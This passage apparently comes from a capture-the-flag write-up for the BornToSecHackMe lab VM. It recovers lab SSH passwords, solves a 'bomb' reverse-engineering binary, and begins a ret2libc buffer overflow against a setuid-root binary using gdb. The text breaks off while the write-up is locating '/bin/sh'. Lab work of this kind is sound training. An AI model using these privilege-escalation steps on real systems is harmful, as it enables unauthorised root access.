    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}void useless() {
    printf("Hahahaha Got you!!!\n");
}
*/
//file750
```


We see this and:

```
int main() {
    printf("M");
    printf("Y");
    printf(" ");
    printf("P");
    printf("A");
    printf("S");
    printf("S");
    printf("W");
    printf("O");
    printf("R");
    printf("D");
    printf(" ");
    printf("I");
    printf("S");
    printf(":");
    printf(" ");
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
    printf("Now SHA-256 it and submit");
}
```
From this, we understand that we need to hash the password we obtained from the **`getme`** functions with SHA-256 and connect via SSH.

The output will look something like this = **` MY PASSWORD IS: xxxxx`**

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:grep  "getme" *
0T16C.pcap:char getme4() {
32O0M.pcap:char getme7() {
331ZU.pcap:char getme1() {
4KAOH.pcap:char getme5() {
91CD0.pcap:char getme6() {
B62N4.pcap:char getme3() {
BJPCP.pcap:char getme8() {
BJPCP.pcap:char getme9() {
BJPCP.pcap:char getme10() {
BJPCP.pcap:char getme11() {
BJPCP.pcap:char getme12()
BJPCP.pcap:     printf("%c",getme1());
BJPCP.pcap:     printf("%c",getme2());
BJPCP.pcap:     printf("%c",getme3());
BJPCP.pcap:     printf("%c",getme4());
BJPCP.pcap:     printf("%c",getme5());
BJPCP.pcap:     printf("%c",getme6());
BJPCP.pcap:     printf("%c",getme7());
BJPCP.pcap:     printf("%c",getme8());
BJPCP.pcap:     printf("%c",getme9());
BJPCP.pcap:     printf("%c",getme10());
BJPCP.pcap:     printf("%c",getme11());
BJPCP.pcap:     printf("%c",getme12());
G7Y8I.pcap:char getme2() {
```

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:cat 0T16C.pcap
char getme4() {

//file115
```

Since we know this is source code, we want to examine the next .pcap file.

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:grep file116 *
7DT5Q.pcap://file116
```

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:cat 7DT5Q.pcap
        return 'a';
```

This way we can obtain the values.

```
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

When we do this for all **`getme`** functions, we get the result **`Iheartpwnage`**.

Now we need to hash it with SHA-256.

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

Or you can do this from any website.

Now we can connect via SSH as laurie.

```laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```

```
luji~:ssh laurie@192.168.193.128

The authenticity of host '192.168.193.128 (192.168.193.128)' can't be established.
ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.193.128' (ECDSA) to the list of known hosts.
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.193.128's password:
laurie@BornToSecHackMe:~$

```

Now that we're connected as the laurie user, let's see what our new task is.

```
laurie@BornToSecHackMe:~$ ls -la

total 34
drwxr-x--- 3 laurie   laurie   143 Oct 15  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
```

```
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
```

```
laurie@BornToSecHackMe:~$ cat README

Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```



So I'm downloading the **`bomb`** file to my computer and will analyze it with Binary Ninja. (You can analyze it with other programs if you prefer.)


```
PS C:\Users\Admin\Desktop> scp -P 22 laurie@192.168.193.128:./bomb bomb
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.193.128's password:
bomb           
```


When we analyze it with Binary Ninja:;

```
080489b0    int32_t main(int32_t argc, char** argv, char** envp)

080489c0        void* const var_28
080489c0        
080489c0        if (argc != 1)
080489d3            if (argc != 2)
08048a1b                printf(format: "Usage: %s [<input_file>]\n", *argv)
08048a25                exit(status: 8)
08048a25                noreturn
08048a25            
080489d8            var_28 = &data_8049620
080489e1            FILE* eax_2 = fopen(filename: argv[1], mode: u"r…")
080489e6            infile = eax_2
080489e6            
080489f0            if (eax_2 == 0)
08048a01                printf(format: "%s: Error: Couldn't open %s\n", *argv, argv[1])
08048a0b                exit(status: 8)
08048a0b                noreturn
080489c0        else
080489c7            infile = stdin
080489c7        
08048a30        initialize_bomb()
08048a3d        printf(format: "Welcome this is my little bomb !…", var_28)
08048a4a        printf(format: "only one life good luck !! Have …")
08048a5b        phase_1(read_line())
08048a60        phase_defused()
08048a6d        printf(format: "Phase 1 defused. How about the n…")
08048a7e        phase_2(read_line())
08048a83        phase_defused()
08048a90        printf(format: "That's number 2.  Keep going!\n")
08048aa1        phase_3(read_line())
08048aa6        phase_defused()
08048ab3        printf(format: "Halfway there!\n")
08048ac4        phase_4(read_line())
08048ac9        phase_defused()
08048ad6        printf(format: "So you got that one.  Try this o…")
08048ae7        phase_5(read_line())
08048aec        phase_defused()
08048af9        printf(format: "Good work!  On to the next...\n")
08048b0a        phase_6(read_line())
08048b0f        phase_defused()
08048b1c        return 0

```

Now let's solve all the phases step by step

```
08048b20    int32_t phase_1(char* arg1)

08048b32        int32_t result = strings_not_equal(arg1, "Public speaking is very easy.")
08048b32        
08048b3c        if (result == 0)
08048b46            return result
08048b46        
08048b3e        explode_bomb()
08048b3e        noreturn
```

```phase1 = "Public speaking is very easy."```


```
08048b48    int32_t phase_2(char* arg1)

08048b5b        int32_t var_1c
08048b5b        read_six_numbers(arg1, &var_1c)
08048b5b        
08048b67        if (var_1c != 1)
08048b69            explode_bomb()
08048b69            noreturn
08048b69        
08048b8c        int32_t result
08048b8c        
08048b8c        for (int32_t i = 1; i s<= 5; i += 1)
08048b79            void var_20
08048b79            result = (i + 1) * *(&var_20 + (i << 2))
08048b79            
08048b81            if ((&var_1c)[i] != result)
08048b83                explode_bomb()
08048b83                noreturn
08048b83        
08048b96        return result
```

In order to better analyse the code here, we asked chatgpt to make the code readable. 
We did not see a problem with this because it does not add anything to our learning.
 
```
int32_t phase_2(char* arg1) {
    int32_t numbers[6];
    read_six_numbers(arg1, numbers);
 
    if (numbers[0] != 1) {
        explode_bomb();
    }
 
    int32_t result = 0;
    for (int32_t i = 1; i <= 5; i++) {
        result = (i + 1) * numbers[i - 1];
        if (numbers[i] != result) {
            explode_bomb();
        }
    }
 
    return result;
}
```


```
x0 = 1 (first number)

x1 = (1 + 1) * x0 = 2 * 1 = 2

x2 = (2 + 1) * x1 = 3 * 2 = 6

x3 = (3 + 1) * x2 = 4 * 6 = 24

x4 = (4 + 1) * x3 = 5 * 24 = 120

x5 = (5 + 1) * x4 = 6 * 120 = 720
```

```phase2 = 1 2 6 24 120 720```


```
08048b98    int32_t phase_3(char* arg1)

08048bc2        int32_t result_1
08048bc2        char var_9
08048bc2        int32_t var_8
08048bc2        
08048bc2        if (sscanf(s: arg1, format: "%d %c %d", &result_1, &var_9, &var_8) s<= 2)
08048bc4            explode_bomb()
08048bc4            noreturn
08048bc4        
08048bcd        int32_t ebx
08048bcd        
08048bcd        if (result_1 u> 7)
08048c88            ebx.b = 0x78
08048c8a            explode_bomb()
08048c8a            noreturn
08048c8a        
08048bd3        int32_t result = result_1
08048bd3        
08048bd6        switch (result)
08048be0            case 0
08048be0                ebx.b = 0x71
08048be0                
08048be9                if (var_8 != 0x309)
08048bef                    explode_bomb()
08048bef                    noreturn
08048c00            case 1
08048c00                ebx.b = 0x62
08048c00                
08048c09                if (var_8 != 0xd6)
08048c0f                    explode_bomb()
08048c0f                    noreturn
08048c16            case 2
08048c16                ebx.b = 0x62
08048c16                
08048c1f                if (var_8 != 0x2f3)
08048c21                    explode_bomb()
08048c21                    noreturn
08048c28            case 3
08048c28                ebx.b = 0x6b
08048c28                
08048c31                if (var_8 != 0xfb)
08048c33                    explode_bomb()
08048c33                    noreturn
08048c40            case 4
08048c40                ebx.b = 0x6f
08048c40                
08048c49                if (var_8 != 0xa0)
08048c4b                    explode_bomb()
08048c4b                    noreturn
08048c52            case 5
08048c52                ebx.b = 0x74
08048c52                
08048c5b                if (var_8 != 0x1ca)
08048c5d                    explode_bomb()
08048c5d                    noreturn
08048c64            case 6
08048c64                ebx.b = 0x76
08048c64                
08048c6d                if (var_8 != 0x30c)
08048c6f                    explode_bomb()
08048c6f                    noreturn
08048c76            case 7
08048c76                ebx.b = 0x62
08048c76                
08048c7f                if (var_8 != 0x20c)
08048c81                    explode_bomb()
08048c81                    noreturn
08048c81        
08048c92        if (ebx.b == var_9)
08048c9f            return result
08048c9f        
08048c94        explode_bomb()
08048c94        noreturn
```

```
int32_t phase_3(char* arg1) {
    int32_t index, val;
    char letter;

    if (sscanf(arg1, "%d %c %d", &index, &letter, &val) <= 2) {
        explode_bomb();
    }

    if (index > 7) {
        letter = 'x';
        explode_bomb();
    }

    char expected_char;
    int expected_val;

    switch (index) {
        case 0:
            expected_char = 'q';
            expected_val = 0x309;
            break;
        case 1:
            expected_char = 'b';
            expected_val = 0xd6;
            break;
        case 2:
            expected_char = 'b';
            expected_val = 0x2f3;
            break;
        case 3:
            expected_char = 'k';
            expected_val = 0xfb;
            break;
        case 4:
            expected_char = 'o';
            expected_val = 0xa0;
            break;
        case 5:
            expected_char = 't';
            expected_val = 0x1ca;
            break;
        case 6:
            expected_char = 'v';
            expected_val = 0x30c;
            break;
        case 7:
            expected_char = 'b';
            expected_val = 0x20c;
            break;
        default:
            explode_bomb();
    }

    if (val != expected_val || letter != expected_char) {
        explode_bomb();
    }

    return index;
}

```

```
| First    (`result_1`)  | Character (Hex)| Karakter (ASCII) | Last Num  (Decimal) |
|------------------------|----------------|------------------|---------------------|
| 0                      |  0x71`         |  'q'             | 777                 |
| 1                      |  0x62`         |  'b'             | 214                 |
| 2                      |  0x62`         |  'b'             | 755                 |
| 3                      |  0x6b`         |  'k'             | 251                 |
| 4                      |  0x6f`         |  'o'             | 160                 |
| 5                      |  0x74`         |  't'             | 458                 |
| 6                      |  0x76`         |  'v'             | 780                 |
| 7                      |  0x62`         |  'b'             | 524                 |
```

```
- 0 q 777
- 1 b 214
- 2 b 755
- 3 k 251
- 4 o 160
- 5 t 458
- 6 v 780
- 7 b 524
```
```
phase3 = 1 b 214
```




```
08048ce0    int32_t phase_4(char* arg1)
08048d07        int32_t var_8
08048d07        
08048d07        if (sscanf(s: arg1, format: "%d", &var_8) != 1 || var_8 s<= 0)
08048d09            explode_bomb()
08048d09            noreturn
08048d09        
08048d15        int32_t result = func4(var_8)
08048d15        
08048d20        if (result == 0x37)
08048d2a            return result
08048d2a        
08048d22        explode_bomb()
08048d22        noreturn
```

Function fun4

```
08048cae        if (arg1 s<= 1)
08048cd0            return 1
08048cd0        
08048cb7        int32_t eax_1 = func4(arg1 - 1)
08048cca        return func4(arg1 - 2) + eax_1
```

```

int32_t func4(int32_t n) 
{
    if (n <= 1) 
    {
        return 1;
    }
    return func4(n - 1) + func4(n - 2);
}

int32_t phase_4(char* arg1) 
{
    int32_t input;

    if (sscanf(arg1, "%d", &input) != 1 || input <= 0) 
    {
        explode_bomb();
    }

    int32_t result = func4(input);

    if (result == 0x37) { // 0x37 = 55
        return result;
    } else {
        explode_bomb();
    }
}

```
```
func4(0) = 1
func4(1) = 1
func4(2) = func4(1) + func4(0) = 1 + 1 = 2
func4(3) = func4(2) + func4(1) = 2 + 1 = 3
func4(4) = 5
func4(5) = 8
func4(6) = 13
func4(7) = 21
func4(8) = 34
func4(9) = 55  <-- BINGO!
```
```
Result
func4(var_8) == 55 so that var_8 = 9.
```

``` 
phase_4 = 9 
```





```
08048d2c    int32_t phase_5(char* arg1)

08048d46        if (string_length(arg1) != 6)
08048d48            explode_bomb()
08048d48            noreturn
08048d48        
08048d69        void var_c
08048d69        
08048d69        for (char* i = nullptr; i s<= 5; i = &i[1])
08048d57            int32_t eax
08048d57            eax.b = *(i + arg1)
08048d5a            eax.b &= 0xf
08048d5f            eax.b = (*"isrveawhobpnutfg")[sx.d(eax.b)]
08048d62            *(i + &var_c) = eax.b
08048d62        
08048d6b        char var_6 = 0
08048d7b        int32_t result = strings_not_equal(&var_c, "giants")
08048d7b        
08048d85        if (result == 0)
08048d94            return result
08048d94        
08048d87        explode_bomb()
08048d87        noreturn
```

```
int32_t phase_5(char* arg1) {
    if (string_length(arg1) != 6) {
        explode_bomb();
    }

    char var_c[6];
    for (int i = 0; i <= 5; i++) {
        int32_t eax = arg1[i];
        eax &= 0xf;
        eax = "isrveawhobpnutfg"[eax];
        var_c[i] = eax;
    }

    int32_t result = strings_not_equal(var_c, "giants");

    if (result == 0) {
        return result;
    } else {
        explode_bomb();
    }
}

```

```
### Lookup Table
"isrveawhobpnutfg"
 0123456789abcdef
```

```
### Character Mapping
For "giants":
- 'g' is at position 15 (0xf)
- 'i' is at position 0 (0x0)
- 'a' is at position 5 (0x5)
- 'n' is at position 11 (0xb)
- 't' is at position 13 (0xd)
- 's' is at position 1 (0x1)

#### How it works:
- 'o' & 0xf = 0xf (15) → 'g'
- 'p' & 0xf = 0x0 (0) → 'i'
- 'e' & 0xf = 0x5 (5) → 'a'
- 'k' & 0xf = 0xb (11) → 'n'
- 'm' & 0xf = 0xd (13) → 't'
- 'q' & 0xf = 0x1 (1) → 's'
```

```phase5 = opekmq```



```
08048d98    int32_t phase_6(char* arg1)

08048d9f        void* esi
08048d9f        void* var_58 = esi
08048db3        void var_1c
08048db3        read_six_numbers(arg1, &var_1c)
08048db3        
08048e00        for (int32_t i = 0; i s<= 5; i += 1)
08048dca            if (*(&var_1c + (i << 2)) - 1 u> 5)
08048dcc                explode_bomb()
08048dcc                noreturn
08048dcc            
08048dd7            for (int32_t j = i + 1; j s<= 5; j += 1)
08048def                if (*((i << 2) + &var_1c) == *(&var_1c + (j << 2)))
08048df1                    explode_bomb()
08048df1                    noreturn
08048df1        
08048e42        int32_t* var_34
08048e42        
08048e42        for (int32_t i_1 = 0; i_1 s<= 5; i_1 += 1)
08048e10            void* esi_3 = &node1
08048e13            int32_t j_1 = 1
08048e18            int32_t eax_5 = i_1 << 2
08048e18            
08048e24            if (1 s< *(eax_5 + &var_1c))
08048e29                esi_3 = &node1
08048e29                
08048e36                do
08048e30                    esi_3 = *(esi_3 + 8)
08048e33                    j_1 += 1
08048e36                while (j_1 s< *(eax_5 + &var_1c))
08048e36            
08048e3b            (&var_34)[i_1] = esi_3
08048e3b        
08048e44        int32_t* esi_4 = var_34
08048e47        int32_t* var_38 = esi_4
08048e47        
08048e5e        for (int32_t i_2 = 1; i_2 s<= 5; i_2 += 1)
08048e52            int32_t* eax_7 = (&var_34)[i_2]
08048e55            esi_4[2] = eax_7
08048e58            esi_4 = eax_7
08048e58        
08048e60        esi_4[2] = 0
08048e6a        int32_t i_3 = 0
08048e6c        int32_t* esi_6 = var_38
08048e85        int32_t result
08048e85        
08048e85        do
08048e73            result = *esi_6
08048e73            
08048e77            if (result s< *esi_6[2])
08048e79                explode_bomb()
08048e79                noreturn
08048e79            
08048e7e            esi_6 = esi_6[2]
08048e81            i_3 += 1
08048e85        while (i_3 s<= 4)
08048e85        
08048e90        return result
```
```
int32_t phase_6(char* input) {
    int32_t values[6];
    read_six_numbers(input, values);
    
    // Check that each number is between 1-6 and unique
    for (int32_t i = 0; i <= 5; i++) {
        if (values[i] - 1 > 5) {
            explode_bomb();
        }
        
        for (int32_t j = i + 1; j <= 5; j++) {
            if (values[i] == values[j]) {
                explode_bomb();
            }
        }
    }
    
    // Map each input value to a node
    int32_t* node_ptrs[6];
    for (int32_t i = 0; i <= 5; i++) {
        int32_t* current = &node1;
        
        for (int32_t j = 1; j < values[i]; j++) {
            current = *(current + 8/4); // Follow the pointer at offset 8
        }
        
        node_ptrs[i] = current;
    }
    
    // Create a linked list from the nodes
    int32_t* head = node_ptrs[0];
    int32_t* current = head;
    
    for (int32_t i = 1; i <= 5; i++) {
        current[2] = node_ptrs[i]; // Set next pointer (at offset 8)
        current = node_ptrs[i];
    }
    
    current[2] = 0; // Terminate the linked list
    
    // Verify that values are in descending order
    current = head;
    for (int32_t i = 0; i <= 4; i++) {
        if (*current < *(current[2])) {
            explode_bomb();
        }
        current = current[2];
    }
    
    return *current;
}
```

```
laurie@BornToSecHackMe:~$ gdb ./bomb

GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/laurie/bomb...done.
```
```
(gdb) b main
Breakpoint 1 at 0x80489b7: file bomb.c, line 36.
(gdb) run
Starting program: /home/laurie/bomb

Breakpoint 1, main (argc=1, argv=0xb7fd0ff4) at bomb.c:36
36      bomb.c: No such file or directory.
(gdb) display node1
1: node1 = 253
(gdb) display node2
2: node2 = 725
(gdb) display node3
3: node3 = 301
(gdb) display node4
4: node4 = 997
(gdb) display node5
5: node5 = 212
(gdb) display node6
6: node6 = 432
(gdb)
```

```
1. Input Requirements:
   - Must provide 6 numbers
   - Each number must be between 1-6
   - No duplicate numbers allowed

2. Linked List Structure:

    - node1: value = 253, next = node2
    - node2: value = 725, next = node3
    - node3: value = 301, next = node4
    - node4: value = 997, next = node5
    - node5: value = 212, next = node6
    - node6: value = 432, next = null


3. Solution Logic:
   - The input numbers represent the order we want to rearrange the nodes
   - The final arrangement must have values in descending order
   - Target order: 997 > 725 > 432 > 301 > 253 > 212

4. Node Values in Descending Order:
   - 997 (node4)
   - 725 (node2)
   - 432 (node6)
   - 301 (node3)
   - 253 (node1)
   - 212 (node5)
```

```phase6 = 4 2 6 3 1 5```



Now that we've completed all phases, we see this result:

```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

In the PDF, there was a note saying that if your password is 123456, you should make it 123546.


Therefore, our SSH password for thor is:

```thor - Publicspeakingisveryeasy.126241207201b2149opekmq426135```



Yes, now we are connected to thor via ssh and we have two files.
```
thor@BornToSecHackMe:~$ ls -la
total 37
drwxr-x--- 3 thor     thor   129 Oct 15  2015 .
drwxrwx--x 1 www-data root    60 Oct 13  2015 ..
-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
drwx------ 2 thor     thor    43 Oct 15  2015 .cache
-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
```

```
-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
```

```
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

When we researched Turtle a bit, we saw that it is a drawing tool library belonging to python.

Then we wrote a script according to the string we have.

[drawTurtle.py](scripts/drawTurtle.py)


It simply says **`SLASH`** on the screen.

Now that it says **`Can you digest the message? :)`**

```
thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum

646da671ca01bb5d84dbb5fb2238dc8e  -
```
We can log in to the user **`zaz`**.


```zaz : 646da671ca01bb5d84dbb5fb2238dc8e```



When we log in as the zaz user, we encounter the following;

```
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
```

```
zaz@BornToSecHackMe:~$ du mail/
1       mail/.imap/INBOX.Drafts
1       mail/.imap/INBOX.Sent
1       mail/.imap/INBOX.Trash
2       mail/.imap
3       mail/
```

The mail folder was completely empty.

Now we download the **`exploit_me`** program to our host machine to analyze it.


```
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}

```

```
#include <stdio.h>
#include <string.h>

bool main(int argc, int argv) {
    char buffer[140];

    if (argc > 1) {
        strcpy(buffer, *(char **)(argv + 4));
        puts(buffer);
    }

    return argc < 2;
}

```

When we analyze the code, we see that it allocates a 140-byte space, but because it uses strcpy, there is a vulnerability here.

How will we exploit this vulnerability?

```
zaz@BornToSecHackMe:~$ gdb ./exploit_me 


GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.


(gdb) b main
Breakpoint 1 at 0x80483f7


(gdb) run
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f7 in main ()
```

Next, we need to get the address of the system function because the command we will essentially execute is:
**`system("/bin/sh");`**

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
```
system = 0xb7e6b060
little endian = \x60\xb0\xe6\xb7
```

Now that we have obtained the memory address of the system function, we need to use "/bin/sh" next. Using the libraries that the program uses, we will search for the **`"/bin/sh"`** command.

```
(gdb) info proc map


process 2962
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
